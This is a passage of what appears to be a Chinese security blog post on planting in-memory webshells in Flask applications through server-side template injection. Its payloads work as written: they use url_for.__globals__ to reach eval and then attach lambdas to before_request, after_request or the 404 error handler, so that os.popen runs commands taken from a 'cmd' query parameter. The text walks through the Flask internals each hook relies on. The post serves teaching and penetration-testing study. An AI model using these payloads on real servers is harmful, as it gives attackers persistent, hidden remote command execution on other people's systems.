+<span class="k">def</span> <span class="nf">start_proxy_server</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">target_host</span><span class="p">,</span> <span class="n">target_port</span><span class="p">):</span>
+    <span class="n">proxy_handler</span> <span class="o">=</span> <span class="n">HTTPProxyHandler</span><span class="p">(</span><span class="n">target_host</span><span class="p">,</span> <span class="n">target_port</span><span class="p">)</span>
+    <span class="n">server_socket</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+    <span class="n">server_socket</span><span class="o">.</span><span class="n">bind</span><span class="p">((</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
+    <span class="n">server_socket</span><span class="o">.</span><span class="n">listen</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s2">"Proxy server is running on {host}:{port} and forwarding to {target_host}:{target_port}..."</span><span class="p">)</span>
+
+    <span class="k">try</span><span class="p">:</span>
+        <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+            <span class="n">client_socket</span><span class="p">,</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">server_socket</span><span class="o">.</span><span class="n">accept</span><span class="p">()</span>
+            <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s2">"Connection from {addr}"</span><span class="p">)</span>
+            <span class="n">thread</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">proxy_handler</span><span class="o">.</span><span class="n">handle_request</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">client_socket</span><span class="p">,))</span>
+            <span class="n">thread</span><span class="o">.</span><span class="n">daemon</span> <span class="o">=</span> <span class="bp">True</span>
+            <span class="n">thread</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+    <span class="k">except</span> <span class="ne">KeyboardInterrupt</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s2">"Shutting down proxy server..."</span><span class="p">)</span>
+    <span class="k">finally</span><span class="p">:</span>
+        <span class="n">server_socket</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+
+
+<span class="k">def</span> <span class="nf">run_flask_app</span><span class="p">():</span>
+    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">debug</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">host</span><span class="o">=</span><span class="s1">'127.0.0.1'</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">5000</span><span class="p">)</span>
+
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">"__main__"</span><span class="p">:</span>
+    <span class="n">proxy_host</span> <span class="o">=</span> <span class="s2">"0.0.0.0"</span>
+    <span class="n">proxy_port</span> <span class="o">=</span> <span class="mi">5001</span>
+    <span class="n">target_host</span> <span class="o">=</span> <span class="s2">"127.0.0.1"</span>
+    <span class="n">target_port</span> <span class="o">=</span> <span class="mi">5000</span>
+
+    <span class="c1"># 安全反代，防止针对响应头的攻击</span>
+    <span class="n">proxy_thread</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">start_proxy_server</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">proxy_host</span><span class="p">,</span> <span class="n">proxy_port</span><span class="p">,</span> <span class="n">target_host</span><span class="p">,</span> <span class="n">target_port</span><span class="p">))</span>
+    <span class="n">proxy_thread</span><span class="o">.</span><span class="n">daemon</span> <span class="o">=</span> <span class="bp">True</span>
+    <span class="n">proxy_thread</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+
+    <span class="k">print</span><span class="p">(</span><span class="s2">"Starting Flask app..."</span><span class="p">)</span>
+    <span class="n">run_flask_app</span><span class="p">()</span>
+</pre></div>
+<h2 data-content="1" id="33b2386e96035a5685c5752880eb26cc">使用before_request方法构造内存马</h2>
+<p>before_request 是 Flask 框架中的一个方法，它允许你在每次 HTTP 请求到达视图函数之前执行特定的代码</p>
+<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">g</span>
+
+<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
+
+<span class="nd">@app.before_request</span>
+<span class="k">def</span> <span class="nf">before_request</span><span class="p">():</span>
+    <span class="c1"># 这里的代码将在每个请求处理之前执行</span>
+    <span class="n">g</span><span class="o">.</span><span class="n">start_time</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>  <span class="c1"># 记录请求开始的时间</span>
+    <span class="k">print</span><span class="p">(</span><span class="s2">"This runs before each request."</span><span class="p">)</span>
+
+<span class="nd">@app.route</span><span class="p">(</span><span class="s1">'/'</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
+    <span class="c1"># 这是处理主页请求的视图函数</span>
+    <span class="k">return</span> <span class="s2">"Hello, World!"</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">'__main__'</span><span class="p">:</span>
+    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">()</span>
+</pre></div>
+<p>在这个例子中，before_request 函数会在每个请求到来前被调用，并且会打印一条消息到控制台<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20241216140021-08e8a346-bb73-1.png"/></p>
+<p>跟进这个装饰器内部看他调用了哪些函数:</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241216125055-5565544e-bb69-1.png"/><br/>
+可以看到before_request实际上调用的是self.before_request_funcs.setdefault(None, []).append(f)<br/>
+代码逻辑：</p>
+<pre><code>self.before_request_funcs.setdefault(None, []): before_request_funcs 是一个字典，用来存储不同蓝图（或应用程序级别）的 before_request 函数列表。setdefault 方法确保了当键 None 不存在时，会创建一个空列表作为其值。这里 None 代表应用级别的 before_request 函数。
+.append(f): 将传入的函数 f 添加到 before_request 函数列表中，这意味着该函数会在每个请求开始前被执行。f就是访问值，也是我们可以自定义的，那么这里只要我们设置f为一个匿名函数，这样每次发起请求前，都会触发一个这个匿名函数了
+return f: 返回原始函数 f，这使得装饰器可以用作函数修饰，而不会改变函数本身的行为。</code></pre>
+<p>接下来就可以开始构造了</p>
+<div class="highlight"><pre><span></span><span class="p">{{</span><span class="n">url_for</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">'__builtins__'</span><span class="p">][</span><span class="s1">'eval'</span><span class="p">](</span><span class="s2">"__import__('sys').modules['__main__'].__dict__['app'].before_request_funcs.setdefault(None,[]).append(lambda+:__import__('os').popen('dir').read())"</span><span class="p">)}}</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241216132041-7e23d3f2-bb6d-1.png"/></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241216132328-e1a0a19e-bb6d-1.png"/></p>
+<h2 data-content="1" id="66fd52f00ce4c313aca387ad34318296">after_request方法构造内存马</h2>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241216133948-29e90d86-bb70-1.png"/><br/>
+与@app.before_request类似，after_request会在请求结束得到响应包之后进行操作<br/>
+代码逻辑：</p>
+<pre><code>self.after_request_funcs.setdefault(None, []): after_request_funcs 是一个字典，用来存储不同蓝图（或应用程序级别）的 after_request 函数列表。setdefault 方法确保了当键 None 不存在时，会创建一个空列表作为其值。这里 None 代表应用级别的 after_request 函数。
+.append(f): 将传入的函数 f 添加到 after_request 函数列表中，这意味着该函数会在每个请求处理完成后被执行。
+return f: 返回原始函数 f，这使得装饰器可以用作函数修饰，而不会改变函数本身的行为。
+self.after_request_funcs.setdefault(None, []).append(f)传入的f就是对应的自定义函数，但这里的f需要接收一个response对象，同时返回一个response对象，所以这个是需要定义一个返回值的</code></pre>
+<p>构造payload：</p>
+<div class="highlight"><pre><span></span><span class="p">{{</span><span class="n">url_for</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">'__builtins__'</span><span class="p">][</span><span class="s1">'eval'</span><span class="p">](</span><span class="s2">"app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get('cmd') and exec(</span><span class="se">\"</span><span class="s2">global CmdResp;CmdResp=__import__(</span><span class="se">\'</span><span class="s2">flask</span><span class="se">\'</span><span class="s2">).make_response(__import__(</span><span class="se">\'</span><span class="s2">os</span><span class="se">\'</span><span class="s2">).popen(request.args.get(</span><span class="se">\'</span><span class="s2">cmd</span><span class="se">\'</span><span class="s2">)).read())</span><span class="se">\"</span><span class="s2">)==None else resp)"</span><span class="p">,{</span><span class="s1">'request'</span><span class="p">:</span><span class="n">url_for</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">'request'</span><span class="p">],</span><span class="s1">'app'</span><span class="p">:</span><span class="n">url_for</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">'current_app'</span><span class="p">]})}}</span>
+</pre></div>
+<p>Lambda 函数逻辑：</p>
+<pre><code>条件检查：if request.args.get('cmd') 检查请求的查询字符串中是否存在名为 cmd 的参数。
+命令执行：如果 cmd 参数存在，那么使用 exec 执行一段 Python 代码，这段代码会读取并执行 cmd 参数中的命令，并将输出封装进一个新的 Flask Response 对象 CmdResp 中。
+    exec('global CmdResp;CmdResp=make_response(os.popen(request.args.get("cmd")).read())')
+    注意这里的 os.popen 和 exec 的使用，它们分别用于执行命令和动态执行 Python 代码。
+返回值判断：== None 检查 exec 的返回值是否为 None（实际上 exec 总是返回 None）。
+最终返回：如果上述条件成立（即 cmd 参数存在且命令成功执行），则返回新的响应对象 CmdResp；否则返回原始的响应对象 resp。</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241216143027-3cf8be74-bb77-1.png"/></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241216143045-4847f470-bb77-1.png"/></p>
+<h2 data-content="1" id="54eb454214bd3804964339b09a7fc1b0">errorhandler方法构造内存马</h2>
+<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">render_template</span>
+
+<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
+<span class="nd">@app.route</span><span class="p">(</span><span class="s1">'/'</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
+    <span class="k">return</span> <span class="s1">'Hello World'</span>
+
+<span class="nd">@app.errorhandler</span><span class="p">(</span><span class="mi">404</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">page_not_found</span><span class="p">(</span><span class="n">e</span><span class="p">):</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
+    <span class="c1"># 日志记录或其它处理逻辑</span>
+    <span class="k">print</span><span class="p">(</span><span class="s1">'Error handler for 404'</span><span class="p">)</span>
+    <span class="k">return</span> <span class="s1">'404 Error'</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">'__main__'</span><span class="p">:</span>
+    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">()</span>
+</pre></div>
+<p>当用户请求了一个不存在的 URL 时，Flask 会调用 page_not_found 函数，要是我能操控404页面返回的东西，那不就可以执行任意代码了吗<br/>
+跟进errorhandler</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241216145252-5eabd800-bb7a-1.png"/><br/>
+跟进register_error_handler函数</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241216145811-1d28c928-bb7b-1.png"/><br/>
+可以看到exc_class, code这两个变量，code就是404，exc_class是一个对象，f是我们404界面的返回值<br/>
+code和f是我们可以手动构造的，但是exc_class得通过_get_exc_class_and_code函数获取，code_or_exception就是我们之前传的404，那我们就依靠这个来获取变量值，然后覆写即可<br/>
+下面是一个不需要装饰器，直接使用 register_error_handler 方法来注册错误处理程序的例子：</p>
+<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span>
+
+<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
+
+<span class="c1"># 定义一个简单的错误处理程序</span>
+<span class="k">def</span> <span class="nf">handle_404</span><span class="p">(</span><span class="n">e</span><span class="p">):</span>
+    <span class="k">return</span> <span class="s1">'Page not found'</span><span class="p">,</span> <span class="mi">404</span>
+
+<span class="k">def</span> <span class="nf">handle_exception</span><span class="p">(</span><span class="n">e</span><span class="p">):</span>
+    <span class="k">return</span> <span class="s1">'An unexpected error occurred'</span><span class="p">,</span> <span class="mi">500</span>
+
+<span class="c1"># 注册错误处理程序</span>
+<span class="n">app</span><span class="o">.</span><span class="n">register_error_handler</span><span class="p">(</span><span class="mi">404</span><span class="p">,</span> <span class="n">handle_404</span><span class="p">)</span>
+<span class="n">app</span><span class="o">.</span><span class="n">register_error_handler</span><span class="p">(</span><span class="ne">Exception</span><span class="p">,</span> <span class="n">handle_exception</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">'__main__'</span><span class="p">:</span>
+    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">()</span>
+</pre></div>
+<p>如果你多次对同一个 code_or_exception 使用 register_error_handler 方法，后面的调用会覆盖前面的注册。<br/>
+payload:</p>
+<div class="highlight"><pre><span></span><span class="k">exec</span><span class="p">(</span><span class="s2">"global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__('os').popen(request.args.get('cmd')).read()"</span><span class="p">)</span>
+</pre></div>
+<p>payload解读：</p>
+<pre><code>global exc_class; global code:
+这一部分声明 exc_class 和 code 为全局变量。确保 exc_class 和 code 在后续代码中可以被正确引用。
+
+exc_class, code = app._get_exc_class_and_code(404):
+这行代码调用了 Flask 应用实例 app 的私有方法 _get_exc_class_and_code，传入 HTTP 状态码 404。该方法会返回与状态码 404 相关的异常类 (exc_class) 和状态码 (code)。
+
+app.error_handler_spec[None][code][exc_class] = lambda a: __import__('os').popen(request.args.get('cmd')).read():
+这里最关键的部分：
+    app.error_handler_spec 是 Flask 内部用来存储错误处理程序的数据结构。
+    lambda a: __import__('os').popen(request.args.get('cmd')).read() 创建了一个匿名函数（Lambda），它接收一个参数 a（通常是异常对象），但忽略了这个参数。
+    它导入了 os 模块，并调用了 popen 方法来执行由 request.args.get('cmd') 获取的命令。request.args.get('cmd') 从 HTTP 请求的查询参数中获取名为 cmd 的值，这意味着任何通过 URL 参数传入的命令都会被执行。
+    最后，.read() 方法读取命令执行的结果并返回。</code></pre>
+</div>
+</div>
